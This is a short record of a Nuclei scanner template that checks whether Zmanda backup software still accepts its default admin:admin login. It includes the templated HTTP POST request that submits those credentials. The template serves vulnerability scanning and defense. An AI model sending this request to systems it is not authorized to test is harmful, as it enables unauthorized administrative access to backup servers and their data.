# Nuclei Template: Zmanda Default Login
**Template ID:** zmanda-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`zmanda-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Zmanda default admin credentials admin:admin were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /ZMC_Admin_Login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: zmc_cookies_enabled=true

login=AEE&last_page=&username={{username}}&password={{password}}&submit=Login&JS_SWITCH=JS_ON
```

## References
- https://www.zmanda.com
